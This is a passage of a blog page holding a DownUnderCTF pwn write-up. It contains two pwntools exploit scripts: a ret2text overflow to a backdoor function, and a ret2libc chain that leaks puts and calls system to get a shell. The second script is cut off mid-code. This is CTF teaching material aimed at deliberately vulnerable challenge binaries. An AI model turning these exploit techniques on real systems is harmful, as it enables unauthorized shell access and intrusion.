<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>wp DownUnderCTF | I0gan</title><meta name="keywords" content="wp"><meta name="author" content="i0gan"><meta name="copyright" content="i0gan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="DownUnderCTF PWN WPplatform 1 [shellthis]There is a backdoor function named get_shell, then use ret2txt way to get shell exp#!&#x2F;usr&#x2F;bin&#x2F;env python3 #-*- coding:utf-8 -*- # author: i0gan # env: pwndocke">
<meta property="og:type" content="article">
<meta property="og:title" content="wp DownUnderCTF">
<meta property="og:url" content="http://blog.i0gan.cn/2020/09/22/wp-down-under-ctf/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="DownUnderCTF PWN WPplatform 1 [shellthis]There is a backdoor function named get_shell, then use ret2txt way to get shell exp#!&#x2F;usr&#x2F;bin&#x2F;env python3 #-*- coding:utf-8 -*- # author: i0gan # env: pwndocke">
<meta property="og:locale">
<meta property="og:image" content="http://blog.i0gan.cn/img/text_bg.jpg">
<meta property="article:published_time" content="2020-09-21T16:32:31.000Z">
<meta property="article:modified_time" content="2020-09-22T13:46:56.054Z">
<meta property="article:author" content="i0gan">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blog.i0gan.cn/img/text_bg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.i0gan.cn/2020/09/22/wp-down-under-ctf/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-09-22 21:46:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/text_bg.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">I0gan</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">wp DownUnderCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-09-21T16:32:31.000Z" title="Created 2020-09-22 00:32:31">2020-09-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-09-22T13:46:56.054Z" title="Updated 2020-09-22 21:46:56">2020-09-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DownUnderCTF-PWN-WP"><a href="#DownUnderCTF-PWN-WP" class="headerlink" title="DownUnderCTF PWN WP"></a>DownUnderCTF PWN WP</h1><p><a target="_blank" rel="noopener" href="https://play.duc.tf/login?next=/team?next=%252Fchallenges%253F#added%20protection-63">platform</a></p>
<h2 id="1-shellthis"><a href="#1-shellthis" class="headerlink" title="1 [shellthis]"></a>1 [shellthis]</h2><p>There is a backdoor function named get_shell, then use ret2txt way to get shell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># author: i0gan</span>
<span class="token comment" spellcheck="true"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>


context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

elf_path  <span class="token operator">=</span> <span class="token string">'pwn'</span>
MODIFY_LD <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token string">'64'</span>
libc_v <span class="token operator">=</span> <span class="token string">'2.23'</span>

ld_path   <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/ld-linux-x86-64.so.2'</span>
libs_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib'</span>
libc_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'./libc.so.6'</span>

<span class="token comment" spellcheck="true"># change ld path </span>
<span class="token keyword">if</span><span class="token punctuation">(</span>MODIFY_LD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cp '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">'.bk'</span><span class="token punctuation">)</span>
    change_ld_cmd <span class="token operator">=</span> <span class="token string">'patchelf  --set-interpreter '</span> <span class="token operator">+</span> ld_path <span class="token operator">+</span><span class="token string">' '</span> <span class="token operator">+</span> elf_path
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>change_ld_cmd<span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'modify ld ok!'</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"chal.duc.tf"</span>
server_port <span class="token operator">=</span> <span class="token number">30002</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">0</span>


<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x30</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'get_shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libc_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="2-return-to-what"><a href="#2-return-to-what" class="headerlink" title="2 [return-to-what]"></a>2 [return-to-what]</h2><p>This vuln </p>
<pre class=" language-c"><code class="language-c">__int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-30h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Where would you like to return to?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>This vuln is a common stack overflow vuln, but no backdoor function we can use. we should leak libc base address before program end, then use ret2libc methond to call system function to get shell.</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># author: i0gan</span>
<span class="token comment" spellcheck="true"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>


context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

elf_path  <span class="token operator">=</span> <span class="token string">'./return-to-what'</span>
MODIFY_LD <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token string">'64'</span>
libc_v <span class="token operator">=</span> <span class="token string">'2.23'</span>

ld_path   <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/ld-linux-x86-64.so.2'</span>
libs_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib'</span>
libc_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'./libc.so.6'</span>

<span class="token comment" spellcheck="true"># change ld path </span>
<span class="token keyword">if</span><span class="token punctuation">(</span>MODIFY_LD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cp '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">'.bk'</span><span class="token punctuation">)</span>
    change_ld_cmd <span class="token operator">=</span> <span class="token string">'patchelf  --set-interpreter '</span> <span class="token operator">+</span> ld_path <span class="token operator">+</span><span class="token string">' '</span> <span class="token operator">+</span> elf_path
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>change_ld_cmd<span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'modify ld ok!'</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"chal.duc.tf"</span>
server_port <span class="token operator">=</span> <span class="token number">30003</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">0</span>


<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x040122b</span>
    ret <span class="token operator">=</span> <span class="token number">0x0401016</span>
    p <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x30</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4011AD</span><span class="token punctuation">)</span>
    db<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> b<span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x0809c0</span>
    li<span class="token punctuation">(</span><span class="token string">'lib_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x04f440</span>
    sh_str <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1b3e9a</span>
    p <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x30</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sh_str<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libc_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
